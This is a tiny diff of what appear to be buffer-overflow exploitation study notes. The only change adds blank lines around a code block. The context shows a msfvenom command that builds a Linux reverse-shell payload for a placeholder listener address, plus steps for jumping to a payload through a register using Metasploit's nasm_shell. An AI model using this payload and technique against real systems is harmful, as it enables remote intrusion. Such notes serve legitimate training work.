@@ -63,11 +63,13 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP>LPORT=<PORT> EXITFUNC=thread -
 Use the front of payload instead
 1. Is there any register points to the front of our payload? EAX, EDX?
 2. Check JMP register address
+
 ```
 /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
 
 JMP EAX/EBX/ECX/EDX
 ```
+
 3. Append the address as shell code.
 4. Add payload to the front
 
